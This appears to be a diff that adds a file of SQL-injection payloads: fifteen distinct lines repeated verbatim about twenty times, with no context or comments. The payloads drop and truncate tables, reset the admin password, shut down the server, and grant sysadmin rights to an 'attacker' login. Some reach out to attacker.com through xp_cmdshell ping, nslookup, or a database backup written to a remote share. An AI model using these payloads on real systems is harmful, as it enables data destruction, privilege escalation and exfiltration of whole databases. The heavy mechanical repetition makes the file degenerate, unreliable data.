@@ -1,0 +1,300 @@
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
+'; DROP TABLE users;--
+'; CREATE TABLE test (id INT);--
+'; INSERT INTO logs (entry) VALUES ('Attacked');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM orders WHERE order_id=1;--
+'; EXEC xp_cmdshell('ping attacker.com');--
+'; SHUTDOWN;--
+'; ALTER TABLE users ADD COLUMN hacked INT;--
+'; TRUNCATE TABLE logs;--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--
+'; GRANT ALL PRIVILEGES ON users TO 'attacker';--
+'; DENY INSERT ON orders TO public;--
+'; RECONFIGURE;--
